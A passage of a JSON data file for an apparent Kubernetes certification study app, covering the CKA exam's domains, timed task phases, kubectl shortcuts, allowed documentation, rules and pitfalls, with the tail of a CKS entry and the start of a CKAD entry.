     "cost": "Falco fails to start, produces no alerts, and the Monitoring/Runtime task (20% domain) scores zero — and the failure is silent unless you check the service.",
     "guard": "Template the Falco task as validate → restart → tail logs (`falco --validate <file> && systemctl restart falco && journalctl -fu falco`), with the rule-file locations and the required keys on the card. Falco docs are allow-listed, so link them as a one-click bookmark."
    },
    {
     "text": "kube-bench remediation applied to the wrong file or without a restart: apiserver/scheduler/controller-manager fixes go in /etc/kubernetes/manifests/*.yaml (kubelet restarts them automatically), but kubelet fixes go in /var/lib/kubelet/config.yaml and require `systemctl restart kubelet`. Also running without `--targets` on the wrong node type.",
     "cost": "The remediation looks applied but the running component still has the old setting, so the re-scan still reports FAIL.",
     "guard": "Card the file-to-component mapping and the restart requirement, and make 're-run kube-bench and confirm the check now PASSes' the verification step rather than 'edited the file'."
    },
    {
     "text": "Spending 20–25 minutes on one task. With 120 minutes and 15–20 tasks the honest budget is roughly 6–7 minutes each, and CKS tasks are each worth only 4–13%.",
     "cost": "One over-run task can consume the time that three others needed. This is how competent candidates finish at 60% instead of 75%.",
     "guard": "Per-task countdown against the computed budget, a hard nudge at 100% of budget ('flag it and move on'), and a flag-for-review list that feeds the final sweep — plus a live domain-weighted score estimate so the user can see that abandoning a 4% task to rescue a 20% one is the right call."
    },
    {
     "text": "Not reading the task's exact namespace, resource name or node name — creating the right object in the default namespace, or hardening the wrong one of three similarly-named deployments.",
     "cost": "Full task loss, and it is invisible without re-reading the task statement during the sweep.",
     "guard": "Require namespace and target-resource fields per task alongside the context field, and echo them back in the verification command the app generates."
    }
   ],
   "retroSections": [
    "Per-task time vs budget — which tasks blew past the computed per-task budget, and the one reason each did",
    "Domain leakage — total the weight of every flagged, skipped or unverified task, grouped by the six curriculum domains, to find where the points actually went",
    "Context discipline — every task where the context was switched late, wrong, or not confirmed",
    "Verification gap — tasks marked 'applied' but never verified against the live end state",
    "Lookups I needed — every command, flag or field name that required a docs search or a --help, especially the ones whose docs are NOT exam-legal (Trivy, kube-bench, kubesec, KubeLinter, AppArmor, seccomp)",
    "Blast radius — any moment the control plane went down, what caused it, and how long recovery took",
    "Pre-flight audit — did the shell aliases, vim settings and docs bookmarks get set in the first 90 seconds, or were they improvised mid-task",
    "Next session plan — the two lowest-scoring domains, the three commands to drill to muscle memory, and the one recovery procedure to rehearse"
   ],
   "sources": [
    "https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/",
    "https://github.com/cncf/curriculum",
    "https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf",
    "https://docs.linuxfoundation.org/tc-docs/certification/faq-cka-ckad-cks",
    "https://docs.linuxfoundation.org/tc-docs/certification/important-instructions-cks",
    "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed",
    "https://training.linuxfoundation.org/blog/now-updated-cks-exam/",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface/examui-performance-based-exams",
    "https://kubernetes.io/docs/tutorials/security/apparmor/",
    "https://kubernetes.io/docs/tutorials/security/seccomp/",
    "https://kubernetes.io/docs/concepts/security/pod-security-admission/"
   ],
   "unverified": [
    "taskCount is set to 16 as a planning figure. The Linux Foundation publishes only a range — 'The exams consist of 15-20 performance-based tasks' (important-instructions-cks). No exact per-sitting count is published; the app should let the user correct the count at session start and recompute the per-task budget from it.",
    "Per-task percentage weights shown in the exam UI: widely reported by candidates (roughly 4–13% per task) but NOT published by the Linux Foundation. Treat the app's domain-weighted score estimate as an estimate, and let the user enter the real per-task weight when the exam shows one.",
    "The historical 'one additional browser tab' wording no longer appears on the current Resources Allowed page. What IS currently published is the explicit URL allow-list plus the note that searching within kubernetes.io/docs is allowed but external search results must not be opened. Treat 'one tab' as a safe practice convention rather than a quoted current rule.",
    "No Linux Foundation documentation confirms an in-exam flag-for-review or notepad feature. The ExamUI page documents only the timer (with 30/15/5-minute alerts), a resizable content panel and the copy/paste key bindings. The flag-for-review list is therefore a function the app must provide, not a mirror of an exam feature.",
    "Free-retake conditions: the CKS product page states one retake is included with purchase, but the detailed eligibility conditions in the candidate handbook were not re-verified.",
    "Which CIS benchmark version kube-bench targets in the current exam environment, and whether gVisor, Kata Containers, Falco, Trivy, kubesec and KubeLinter are pre-installed on the exam clusters or must be installed as part of a task. Candidate reports vary and the Linux Foundation does not publish the image contents.",
    "CKS curriculum is published at v1.34 while CKA and CKAD are at v1.35 and the CKS exam environment runs Kubernetes v1.35. Whether a v1.35 CKS curriculum PDF is pending was not determinable; re-check https://github.com/cncf/curriculum before a sitting.",
    "Whether the exam still presents multiple distinct clusters per sitting (historically yes, each task naming its own context). The important-instructions page confirms per-task contexts and SSH-to-node tasks but does not state a cluster count."
   ],
   "notes": [
    "Two official pages disagree on the weights. The CKS v1.34 curriculum PDF and training.linuxfoundation.org give Cluster Setup 15% / System Hardening 10%; cncf.io/training/certification/cks still shows the pre-October-2024 split (10% / 15%). This app follows the curriculum PDF, which is the authoritative one.",
    "CKS curriculum is still published at v1.34 while CKA and CKAD are at v1.35 — re-check before sitting."
   ],
   "appFeatures": []
  },
  {
   "id": "cka",
   "name": "CKA — Certified Kubernetes Administrator",
   "icon": "☸️",
   "tagline": "For the cluster operator: 15–20 hands-on tasks in 2 hours, scored by weighted curriculum domain — won on imperative kubectl speed and lost on working in the wrong place.",
   "kind": "tasks",
   "focus": "kubernetes",
   "status": "active",
   "statusNote": "",
   "durationMin": 120,
   "taskCount": 20,
   "format": "hands-on performance-based; PSI Bridge secure browser → Remote Desktop with a Linux terminal; each task's infobox names the designated host you must ssh into; remote proctored; ReadMe tab + task Content Panel with a navigation menu, Flag Item to review, and a countdown timer that alerts at 30/15/5 minutes remaining",
   "passMark": 66,
   "curriculumVersion": "CKA Curriculum v1.35 (exam environment running Kubernetes v1.35)",
   "retakeNote": "Exam price $445 and includes one free retake (cncf.io/training/certification/cka). Certifications passed on or after 1 April 2024 are valid for 2 years (earlier passes were 3 years); recertifying resets the clock a further 2 years. CARE (Certification Advancement & Recertification Experience), effective 18 June 2026: achieving or recertifying CKS automatically updates your CKA expiry to match the new CKS expiry — even if the CKA has already expired.",
   "domains": [
    {
     "id": "cka-troubleshooting",
     "name": "Troubleshooting",
     "weight": 30,
     "competencies": [
      "Troubleshoot clusters and nodes",
      "Troubleshoot cluster components",
      "Monitor cluster and application resource usage",
      "Manage and evaluate container output streams",
      "Troubleshoot services and networking"
     ]
    },
    {
     "id": "cka-architecture",
     "name": "Cluster Architecture, Installation and Configuration",
     "weight": 25,
     "competencies": [
      "Manage role based access control (RBAC)",
      "Prepare underlying infrastructure for installing a Kubernetes cluster",
      "Create and manage Kubernetes clusters using kubeadm",
      "Manage the lifecycle of Kubernetes clusters",
      "Implement and configure a highly-available control plane",
      "Use Helm and Kustomize to install cluster components",
      "Understand extension interfaces (CNI, CSI, CRI, etc.)",
      "Understand CRDs, install and configure operators"
     ]
    },
    {
     "id": "cka-networking",
     "name": "Services and Networking",
     "weight": 20,
     "competencies": [
      "Understand connectivity between Pods",
      "Define and enforce Network Policies",
      "Use ClusterIP, NodePort, LoadBalancer service types and endpoints",
      "Use the Gateway API to manage Ingress traffic",
      "Know how to use Ingress controllers and Ingress resources",
      "Understand and use CoreDNS"
     ]
    },
    {
     "id": "cka-workloads",
     "name": "Workloads and Scheduling",
     "weight": 15,
     "competencies": [
      "Understand application deployments and how to perform rolling update and rollbacks",
      "Use ConfigMaps and Secrets to configure applications",
      "Configure workload autoscaling",
      "Understand the primitives used to create robust, self-healing, application deployments",
      "Configure Pod admission and scheduling (limits, node affinity, etc.)"
     ]
    },
    {
     "id": "cka-storage",
     "name": "Storage",
     "weight": 10,
     "competencies": [
      "Implement storage classes and dynamic volume provisioning",
      "Configure volume types, access modes and reclaim policies",
      "Manage persistent volumes and persistent volume claims"
     ]
    }
   ],
   "phases": [
    {
     "id": "preflight",
     "name": "Pre-flight (first 90 seconds)",
     "goal": "Spend the first 90 seconds buying back 10+ minutes: read the ReadMe, ssh to the first task's host, set the two exports that shorten every later command, and make vim stop destroying your YAML indentation. Do this ONCE, on the host — the base system deliberately ships no kubectl.",
     "items": [
      {
       "label": "Read the ReadMe tab before touching the terminal — it names the environment conventions for this form",
       "hint": ""
      },
      {
       "label": "ssh into the host named in task 1's infobox (the base system has NO kubectl, yq, curl or man pages)",
       "hint": "ssh <NODENAME>"
      },
      {
       "label": "Confirm the k alias and bash completion are live (LF pre-configures both on every SSH host — do not waste time re-creating them)",
       "hint": "type k; complete -p kubectl"
      },
      {
       "label": "Export the dry-run generator — every YAML you create for the next 2 hours ends in $do",
       "hint": "export do='--dry-run=client -o yaml'"
      },
      {
       "label": "Export the force-delete suffix for stuck pods",
       "hint": "export now='--force --grace-period=0'"
      },
      {
       "label": "Make vim YAML-safe before you ever open a manifest",
       "hint": "printf 'set ts=2 sw=2 et ai nu\\nset cursorcolumn\\n' >> ~/.vimrc"
      },
      {
       "label": "Confirm which cluster this host actually talks to before task 1",
       "hint": "kubectl config current-context && kubectl get nodes -o wide"
      },
      {
       "label": "Open the allowed docs in the remote desktop's Firefox once, now — not mid-task",
       "hint": ""
      },
      {
       "label": "Compute your per-task budget from the real task count shown in the navigation menu",
       "hint": "echo $((115 / <TASK_COUNT>))  # minutes per task, 5 min reserve"
      }
     ]
    },
    {
     "id": "task-loop",
     "name": "Per-task loop",
     "goal": "Run every single task through the same four beats — locate, generate, apply, VERIFY — and start the countdown at beat zero. The task is not done when the manifest applies; it is done when the end state is observable.",
     "items": [
      {
       "label": "Beat 0 — read the infobox and ssh to the host it names; if you are already on a host from the last task, exit first",
       "hint": "exit; ssh <NODENAME>"
      },
      {
       "label": "Beat 0 — confirm context and namespace out loud before the first write",
       "hint": "kubectl config current-context; kubectl config set-context --current --namespace=<NAMESPACE>"
      },
      {
       "label": "Beat 1 — locate: does an imperative form exist? If yes you never hand-write YAML",
       "hint": "kubectl create --help | head -40"
      },
      {
       "label": "Beat 2 — generate with $do, edit the delta only, apply",
       "hint": "kubectl create deployment <NAME> --image=<IMAGE> $do > <NAME>.yaml && vim <NAME>.yaml"
      },
      {
       "label": "Beat 3 — VERIFY the end state, not the apply: get the object back and read the status you were asked to produce",
       "hint": "kubectl get <RESOURCE> <NAME> -n <NAMESPACE> -o wide && kubectl describe <RESOURCE> <NAME> -n <NAMESPACE> | tail -20"
      },
      {
       "label": "Beat 3 — for anything serving traffic, prove it from inside the cluster",
       "hint": "kubectl run probe --rm -it --restart=Never --image=busybox:1.36 -- wget -qO- http://<SVC>.<NAMESPACE>.svc.cluster.local"
      },
      {
       "label": "Over budget? Click Flag Item to review, leave a one-line comment in your scratch file, and move to the next task NOW",
       "hint": "echo 'task <N>: <WHAT_IS_LEFT>' >> ~/todo.txt"
      },
      {
       "label": "Exit the SSH session so the next task starts from a known place",
       "hint": "exit"
      }
     ]
    },
    {
     "id": "sweep",
     "name": "End-of-exam sweep (last 15 minutes)",
     "goal": "The 15-minute alert is your signal to stop starting and start closing. Flagged items get cheapest-first triage; every finished task gets one verification pass.",
     "items": [
      {
       "label": "Open Flagged Items in the navigation menu and rank them by remaining effort, not by task number",
       "hint": ""
      },
      {
       "label": "Finish the cheapest flagged task first — a 90-second fix is worth the same as a 20-minute one",
       "hint": ""
      },
      {
       "label": "Re-verify the high-weight tasks you rushed (Troubleshooting is 30% and Cluster Architecture 25% of the score)",
       "hint": "kubectl get componentstatuses,nodes,pods -A -o wide | grep -vE 'Running|Completed|Healthy|Ready'"
      },
      {
       "label": "Confirm nothing is left in a half-applied state — no Pending PVCs, no CrashLooping pods you created",
       "hint": "kubectl get pvc,pods -A --field-selector=status.phase!=Running"
      },
      {
       "label": "Save and close every open editor buffer — an unsaved vim buffer at time-up scores zero",
       "hint": ":wq"
      },
      {
       "label": "exit back to base so no session dies mid-write when the timer ends",
       "hint": "exit"
      }
     ]
    },
    {
     "id": "retro",
     "name": "Retrospective (after the session)",
     "goal": "There is no pentest report for this exam. The artefact is a personal retrospective: which tasks ran over budget, which domains you bled score in, and which imperative form you failed to reach for.",
     "items": [
      {
       "label": "List every task that exceeded its budget and write down the one command that would have saved it",
       "hint": ""
      },
      {
       "label": "Tally minutes spent per domain against that domain's weight — over-spending on Storage (10%) is a scoring error",
       "hint": ""
      },
      {
       "label": "Count tasks where you hand-wrote YAML that $do could have generated",
       "hint": ""
      },
      {
       "label": "Count context/host errors — target is zero",
       "hint": ""
      },
      {
       "label": "Count tasks where you applied but never verified",
       "hint": ""
      },
      {
       "label": "Build tomorrow's drill list from the two weakest domains only",
       "hint": ""
      }
     ]
    }
   ],
   "timeSavers": [
    {
     "label": "The $do generator — the single highest-value habit",
     "cmd": "export do='--dry-run=client -o yaml'",
     "why": "Turns every 'create a X' task into one line plus a small edit. Saves 2–4 minutes per creation task, and across 15–20 tasks that is the difference between finishing and not."
    },
    {
     "label": "Generate a Pod manifest",
     "cmd": "kubectl run <NAME> --image=<IMAGE> --port=80 --labels=app=<LABEL> $do > pod.yaml",
     "why": "kubectl run only ever creates a Pod now; add --restart=Never to set restartPolicy: Never, and --command -- <CMD> <ARG> for the command block. Faster and less error-prone than typing apiVersion/kind by hand."
    },
    {
     "label": "Generate a Deployment",
     "cmd": "kubectl create deployment <NAME> --image=<IMAGE> --replicas=3 $do > deploy.yaml",
     "why": "The base object in most Workloads tasks. Generate, then edit only the fields the task actually asks for (probes, resources, affinity) — never type the pod template from scratch."
    },
    {
     "label": "Generate a Service without writing a selector",
     "cmd": "kubectl expose deployment <NAME> --port=80 --target-port=8080 --name=<SVC> --type=NodePort $do",
     "why": "expose copies the selector off the live object for you, which is exactly the field people typo. For a Service with no existing workload use 'kubectl create service clusterip <NAME> --tcp=80:8080 $do'."
    },
    {
     "label": "Generate Jobs and CronJobs",
     "cmd": "kubectl create cronjob <NAME> --image=<IMAGE> --schedule='*/1 * * * *' $do -- /bin/sh -c '<CMD>'",
     "why": "Also 'kubectl create job <NAME> --image=<IMAGE>' and 'kubectl create job <NAME> --from=cronjob/<CRONJOB>' to trigger one run immediately. The '--' separator must come last."
    },
    {
     "label": "ConfigMaps from literals and files",
     "cmd": "kubectl create configmap <NAME> --from-literal=<KEY>=<VALUE> --from-file=<FILE> -n <NAMESPACE> $do",
     "why": "--from-file=<DIR> ingests a whole directory as keys; --from-env-file=<FILE> turns a KEY=VALUE file into a flat ConfigMap. Hand-writing the data block with correct indentation costs minutes and usually breaks on multi-line values."
    },
    {
     "label": "Secrets from literals, files and TLS pairs",
     "cmd": "kubectl create secret generic <NAME> --from-literal=password=<VALUE> -n <NAMESPACE> $do",
     "why": "Does the base64 for you — the #1 silent failure is pasting plaintext into a .data field. Use 'create secret tls <NAME> --cert=<PATH>/tls.crt --key=<PATH>/tls.key' and 'create secret docker-registry <NAME> --docker-server=<REGISTRY> --docker-username=<USER> --docker-password=<VALUE>' for the other two forms."
    },
    {
     "label": "Read the schema instead of the website",
     "cmd": "kubectl explain <RESOURCE>.spec --recursive | less",
     "why": "Beats a docs round-trip for 'what is the exact field name'. Narrow it — 'kubectl explain pod.spec.containers.livenessProbe --recursive' — and pipe to grep for the field you half-remember. Usually 15 seconds vs 90 seconds in Firefox."
    },
    {
     "label": "RBAC objects imperatively",
     "cmd": "kubectl create role <ROLE> --verb=get,list,watch --resource=pods -n <NAMESPACE> $do",
     "why": "Pairs with 'kubectl create rolebinding <BINDING> --role=<ROLE> --serviceaccount=<NAMESPACE>:<SA> -n <NAMESPACE>' and 'kubectl create clusterrolebinding <BINDING> --clusterrole=view --user=<USER>'. Cluster Architecture is 25% and RBAC lives there."
    },
    {
     "label": "Verify RBAC before you move on",
     "cmd": "kubectl auth can-i <VERB> <RESOURCE> --as=system:serviceaccount:<NAMESPACE>:<SA> -n <NAMESPACE>",
     "why": "The only honest verification of an RBAC task. Takes 5 seconds and catches a wrong apiGroup or a binding in the wrong namespace, which is otherwise invisible."
    },
    {
     "label": "Label selectors to scope everything",
     "cmd": "kubectl get pods -A -l '<KEY> in (<A>,<B>),<KEY2>!=<C>' -o wide",
     "why": "Set-based selectors let you find the exact objects a task describes without eyeballing a 200-line list. Add --show-labels when the task describes objects by label but does not name them."
    },
    {
     "label": "jsonpath to extract one value",
     "cmd": "kubectl get pods -n <NAMESPACE> -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.nodeName}{\"\\n\"}{end}'",
     "why": "Many tasks say 'write the result to /opt/<FILE>'. jsonpath (or -o custom-columns='NAME:.metadata.name,NODE:.spec.nodeName') gets exactly the shape asked for; grep/awk over describe output gets partial credit at best."
    },
    {
     "label": "Events, newest last",
     "cmd": "kubectl get events -n <NAMESPACE> --sort-by=.metadata.creationTimestamp",
     "why": "Unsorted events are useless. This is the first command of almost every Troubleshooting task (30% of the exam). Narrow with --field-selector type=Warning, or use 'kubectl events --for pod/<POD> -n <NAMESPACE>' for one object's timeline."
    },
    {
     "label": "Clone a live resource into a clean manifest",
     "cmd": "kubectl get <RESOURCE> <NAME> -n <NAMESPACE> -o yaml --show-managed-fields=false > <NAME>.yaml",
     "why": "Fastest way to build object #2 from object #1. Then strip status:, metadata.uid, metadata.resourceVersion, metadata.creationTimestamp and any spec.clusterIP before re-applying — a leftover resourceVersion makes the apply fail outright."
    },
    {
     "label": "Replace when a field is immutable",
     "cmd": "kubectl replace --force -f <FILE>",
     "why": "Deletes and recreates in one step. Changing a Job's selector, a Deployment's selector.matchLabels or a Service's clusterIP will otherwise be rejected — or worse, look like it applied. Saves the delete/create dance."
    },
    {
     "label": "Force-delete a stuck pod",
     "cmd": "kubectl delete pod <POD> -n <NAMESPACE> --force --grace-period=0",
     "why": "Terminating pods on a drained or NotReady node will otherwise block you for the full 30s grace period or indefinitely. Export it once as $now and append it."
    },
    {
     "label": "Switch context / pin namespace",
     "cmd": "kubectl config use-context <CONTEXT>; kubectl config set-context --current --namespace=<NAMESPACE>",
     "why": "Pinning the namespace once removes -n from every subsequent command for that task — fewer keystrokes and fewer objects created in default by accident. Always re-check with 'kubectl config current-context' when a task changes cluster."
    },
    {
     "label": "Node lifecycle for maintenance tasks",
     "cmd": "kubectl drain <NODE> --ignore-daemonsets --delete-emptydir-data --force",
     "why": "Without --ignore-daemonsets the drain refuses immediately; without --delete-emptydir-data it refuses on any pod with an emptyDir. Follow with 'kubectl uncordon <NODE>' — forgetting to uncordon is a classic half-finished task."
    },
    {
     "label": "Static pod and kubelet inspection on a node",
     "cmd": "sudo -i; ls /etc/kubernetes/manifests/; systemctl status kubelet; journalctl -u kubelet -n 50 --no-pager",
     "why": "The whole 'control plane component is down' family of Troubleshooting tasks lives here. Editing a file in /etc/kubernetes/manifests/ restarts that static pod within seconds — no apply needed."
    },
    {
     "label": "Server-side dry run before a risky apply",
     "cmd": "kubectl apply -f <FILE> --dry-run=server && kubectl diff -f <FILE>",
     "why": "--dry-run=server runs real admission/validation without persisting, and diff shows exactly what changes. Ten seconds that prevents an 'it applied but did nothing' task."
    },
    {
     "label": "Short names and apiGroups when you forget one",
     "cmd": "kubectl api-resources | grep -i <TERM>",
     "why": "Gives you the short name, the apiVersion and whether it is namespaced — all three of which you need for RBAC rules and for typing less everywhere else."
    }
   ],
   "allowedDocs": [
    {
     "label": "Kubernetes Documentation",
     "url": "https://kubernetes.io/docs",
     "note": "Allowed including all language translations (e.g. https://kubernetes.io/zh/docs/); English is the most up to date. Using the site's own search is allowed, but you must NOT open external search results."
    },
    {
     "label": "Kubernetes Blog",
     "url": "https://kubernetes.io/blog/",
     "note": "Allowed in full."
    },
    {
     "label": "Helm Documentation",
     "url": "https://helm.sh/docs",
     "note": "Allowed — relevant to the 'Use Helm and Kustomize to install cluster components' competency."
    },
    {
     "label": "Terminal man pages and distribution docs",
     "url": "",
     "note": "man pages and documents installed by the distribution (/usr/share and subdirectories) are allowed from inside the exam terminal."
    },
    {
     "label": "Gateway API Documentation",
     "url": "https://gateway-api.sigs.k8s.io/",
     "note": "On the official CKA allow-list and easy to miss — CKA v1.35 carries a Gateway API competency, so this is a legal resource you would otherwise not open."
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Each task's infobox names the host to work on; you must ssh into that host to perform the task and exit back to the base system afterwards.",
     "enforceable": "Per-task host field, confirmed before the timer starts; current-host banner persists on screen.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "All tasks must be completed on a designated SSH host — the base system (hostname 'base') has none of kubectl, yq, curl, wget or man pages installed.",
     "enforceable": "Pre-flight checklist item: 'ssh to host' before any task command is offered.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Elevated privileges are available on any host via 'sudo -i', and sudo may be used at any time.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Every SSH host has kubectl with the 'k' alias and Bash autocompletion, yq, curl, wget and man pages pre-installed and pre-configured.",
     "enforceable": "Pre-flight skips alias/completion setup and only adds the exports and vim config.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Documentation is limited to kubernetes.io/docs, kubernetes.io/blog and helm.sh/docs, opened in the Firefox browser inside the remote desktop. On-site search is allowed; opening external search results is not.",
     "enforceable": "Allow-list bookmarks are the only outbound links the app offers during a session.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Notes or unauthorized materials: the desk must be clear of all notes and electronics, and no one other than the candidate may be present in the room.",
     "enforceable": "Session start warns that the app itself must be closed before the exam — it is a study tool, not an exam-time tool.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Internet browsing using installed tools such as Vim and Emacs, and access to unauthorized digital resources.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The room must be quiet, private and well-lit.",
     "enforceable": "",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Requesting a break via the Pause Exam function does NOT stop the timer. Timed alerts appear at 30, 15 and 5 minutes remaining.",
     "enforceable": "Session countdown mirrors the 30/15/5 alerts and triggers the sweep phase at 15 minutes.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface/examui-performance-based-exams",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Copy/paste inside the terminal is Ctrl+Shift+C / Ctrl+Shift+V; in other remote-desktop applications it is Ctrl+C / Ctrl+V.",
     "enforceable": "Copy buttons in the app should train the same muscle memory.",
     "source": "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad",
     "confidence": "official"
    }
   ],
   "pitfalls": [
    {
     "text": "Working in the wrong cluster/host. Every task's infobox names the host (and, where the form uses them, the cluster) the work must happen in, and candidates read straight past it — especially after finishing a task and staying in the previous SSH session instead of exiting.",
     "cost": "The entire task scores zero, and you usually also leave stray objects in a cluster where a later task will confuse you. This is the single most common avoidable failure on the exam.",
     "guard": "Per-task host/context field the user must confirm before the timer starts; a persistent 'CURRENT: <host>' banner; a hard nudge whenever two consecutive tasks name different hosts and no exit/ssh was logged."
    },
    {
     "text": "Not verifying the end state. 'kubectl apply' returning 'created' is not the task passing. The pod is Pending, the PVC never bound, the Service selector matches nothing, the probe fails.",
     "cost": "Full marks lost on a task you believe is finished — and you never revisit it, because it felt done.",
     "guard": "A verification step is mandatory before a task can be marked complete; the task cannot be closed on an apply alone, only on a get/describe/curl that shows the asked-for state."
    },
    {
     "text": "Editing an immutable field and not noticing the change never landed. Deployment selector.matchLabels, Job selector, Service clusterIP, most StatefulSet fields — 'kubectl edit' saves your buffer to a temp file and reports an error you scroll past.",
     "cost": "Task scores zero while the object still looks superficially right.",
     "guard": "Immutable-field warning on edit-type tasks with the 'kubectl replace --force -f <FILE>' escape hatch offered inline."
    },
    {
     "text": "Overrunning on a Troubleshooting task. Troubleshooting is 30% of the score but it is also where a single task can eat 25 minutes — and a candidate who spends 25 minutes on one task has already failed.",
     "cost": "Two or three later tasks never get read at all. Losing three easy Storage/Workloads tasks costs more than the one hard Troubleshooting task was worth.",
     "guard": "Per-task countdown against the computed budget with an explicit 'you are over budget — flag it and move on' nudge at 1.5x, and a hard stop prompt at 2x."
    },
    {
     "text": "Leaving a task half-done instead of flagging it and moving on. Half a task is often zero marks, and you have also spent the time.",
     "cost": "You pay the time twice: once on the half-attempt and again when you come back cold with no note about what was left.",
     "guard": "Flagging requires a one-line 'what is left' note, which the end-of-exam sweep replays so you resume in seconds instead of re-reading the task."
    },
    {
     "text": "Ssh-ing to a node for a node-level task (kubelet, static pods, certificates, etcd) and then forgetting to 'exit' — so the next task's kubectl runs against the wrong kubeconfig, or 'sudo -i' leaves you as root in the wrong place.",
     "cost": "Silently corrupts the following task, which then also fails, so one mistake costs two tasks.",
     "guard": "Node-level tasks render an explicit 'exit' as the final, tickable step, and the app refuses to advance while the previous task's host is still marked active."
    },
    {
     "text": "Hand-writing YAML that an imperative command would have generated, then losing minutes to an indentation error in vim with default tab settings.",
     "cost": "3–5 minutes per task, compounding across 15–20 tasks — the most common reason a well-prepared candidate runs out of time.",
     "guard": "Every task type surfaces its $do one-liner first; the pre-flight refuses to complete until the vimrc line is set."
    },
    {
     "text": "Not saving work before the session times out — an open vim buffer, or a manifest written but never applied, at the moment the timer hits zero.",
     "cost": "A task that was fully solved scores zero.",
     "guard": "The 5-minute alert fires a 'save every buffer, apply every pending manifest' checklist that must be dismissed item by item."
    },
    {
     "text": "Burning documentation time on something 'kubectl explain' would have answered in 15 seconds, or getting lost in kubernetes.io search results.",
     "cost": "60–120 seconds per lookup, several times per exam.",
     "guard": "Docs bookmarks open with a visible lookup timer and an 'explain instead?' prompt showing the exact 'kubectl explain <RESOURCE>.spec --recursive' for the resource in the current task."
    },
    {
     "text": "Working in the default namespace because the task named one and you dropped -n, or because you pinned a namespace for a previous task and never changed it.",
     "cost": "Object created in the wrong place; the grader finds nothing where it expects it.",
     "guard": "Namespace is a first-class per-task field alongside host, and the app suggests 'kubectl config set-context --current --namespace=<NAMESPACE>' once per task rather than -n on every line."
    },
    {
     "text": "Forgetting to 'kubectl uncordon' after a drain, or leaving a scaled-down deployment scaled down, when the task only asked for the maintenance step.",
     "cost": "Partial credit at best, and it can break a later task that schedules onto that node.",
     "guard": "Maintenance-type tasks carry a paired teardown step that stays visibly incomplete until ticked."
    }
   ],
   "retroSections": [
    "Time per task vs computed budget (which tasks blew past 1.5x)",
    "Score estimate by weighted domain — where the 30% Troubleshooting and 25% Architecture blocks actually landed",
    "Tasks flagged for review, and which ones you never returned to",
    "Applied-but-not-verified: tasks closed without an end-state check",
    "Host/context/namespace errors (target: zero)",
    "Imperative-generation misses: YAML you typed that $do could have produced",
    "Documentation lookups over 90 seconds, and what kubectl explain would have answered",
    "Two weakest domains → drill list for the next session"
   ],
   "sources": [
    "https://www.cncf.io/training/certification/cka/",
    "https://github.com/cncf/curriculum — CKA_Curriculum_v1.35.pdf (domain weights and competencies verbatim)",
    "https://docs.linuxfoundation.org/tc-docs/certification/faq-cka-ckad-cks (pass mark 66%, Kubernetes v1.35 environment, 2-year validity)",
    "https://docs.linuxfoundation.org/tc-docs/certification/tips-cka-and-ckad (15–20 performance-based tasks, ssh host model, sudo -i, pre-installed tooling, copy/paste keys)",
    "https://docs.linuxfoundation.org/tc-docs/certification/certification-resources-allowed (documentation allow-list)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-rules-and-policies (room, notes and browsing rules)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface (Flag Item to review, navigation menu)",
    "https://docs.linuxfoundation.org/tc-docs/certification/lf-handbook2/exam-user-interface/examui-performance-based-exams (timer alerts at 30/15/5, Pause does not stop the timer)",
    "https://training.linuxfoundation.org/certification-policy-change-2024/ (2-year validity from 1 April 2024)",
    "https://www.cncf.io/blog/2026/06/17/expanding-care-passing-cks-can-now-extend-your-cka-certification/ (CARE, effective 18 June 2026)"
   ],
   "unverified": [
    "Exact task count per exam form. The Linux Foundation states '15-20 performance-based tasks' for CKA and CKAD; taskCount is set to the conservative upper bound of 20 and the app should recompute the per-task budget from the count actually shown in the exam navigation menu.",
    "Whether every task still opens with an explicit 'kubectl config use-context <CONTEXT>' line. The current official instructions describe a per-task designated SSH host and an infobox, and do not mention per-task contexts; older candidate reports describe a use-context preamble. Treat 'confirm where you are' as host AND context until the ReadMe for your form says otherwise.",
    "Presence of an in-exam notepad or scratch pad — not documented in the exam UI pages; plan to keep notes in a file on the host instead.",
    "Length of the eligibility window in which the free retake must be taken — not stated on the CNCF exam page.",
    "Whether the CARE program extends CKA in any direction other than CKS → CKA, and whether any equivalent exists for CKAD.",
    "The CKA v1.35 curriculum PDF prints the 20% domain as 'Servicing and Networking'; the CNCF exam page and all prior versions print 'Services and Networking'. The weight (20%) is identical in both sources; the name used here follows the exam page."
   ],
   "appFeatures": [
    "Flagging a task for review is a feature of THIS app, not a documented feature of the exam UI. The Linux Foundation documents a ReadMe and a Content Panel; it does not publish a flag control."
   ],
   "notes": []
  },
  {
   "id": "ckad",
   "name": "CKAD — Certified Kubernetes Application Developer",
